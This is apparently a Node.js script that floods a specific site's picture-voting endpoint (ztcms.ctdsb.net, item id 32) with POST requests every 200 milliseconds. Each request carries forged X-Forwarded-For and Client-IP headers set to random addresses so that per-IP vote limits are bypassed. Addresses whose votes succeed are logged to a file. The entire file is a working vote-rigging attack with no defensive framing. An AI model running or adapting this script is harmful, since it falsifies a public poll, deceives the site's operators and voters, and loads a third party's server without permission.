var request = require('./../libs/request').request;
var utils = require('./../libs/utils');
var fs = require('fs');
var conf = require('./../libs/config');
var async = require('async');
var wget = require('./../libs/wget');
var console = require('./../libs/Console');
var proxy = process.env.http_proxy;
// proxy = "http://127.0.0.1:8888"
if (proxy){
    request.default({proxy: proxy});
}

var url ='http://ztcms.ctdsb.net/index.php?m=ext&c=votepic&a=votingbzr'
var data = {
	"id[]":"32",
	"catid":"12"
};
var headers={
	// Cookie:'ZDEDebuggerPresent=php,phtml,php3',
	// "HTTP_CLIENT_IP": '10.136.58.38'
};

var index=0;
function doPost(){
	var ip = rnd_ip();
	headers['HTTP_CLIENT_IP'] = headers['HTTP_X_FORWARDED_FOR']= headers['HTTP_X_FORWARDED_FOR'] = headers['REMOTE_ADDR']=ip;
	headers = {
		"Cookie":'ZDEDebuggerPresent=php,phtml,php3',
		"X-FORWARDED-FOR":ip,
		// "REMOTE_ADDR":ip,
		// "HTTP_CLIENT_IP":ip,
		"CLIENT-IP":ip,
		// "Real_ip":ip
	}
	request.post(url,data, function(body, headers){
		// console.log(body);

		if(body.indexOf('成功')!==-1){
			index++;
			console.info(index);
			console.info(ip);
			fs.appendFile('ip.txt',ip+'\n\r');
		}else{
			console.error(ip);
		}
		// setTimeout(function(){
		// 	doPost();
		// },2000);
	},headers);
	setTimeout(function(){
		doPost();
	},200);
	
}

function rnd_ip(){
	function rnd(m,n) {
	    var a=parseInt(Math.random()*(n-m+1)+m);
	    return a;
	};
	return [rnd(1,254), rnd(1,254), rnd(1,254) ,rnd(1,254)].join('.')
}

try{
	doPost();
}catch(e){
	console.error(e);
}
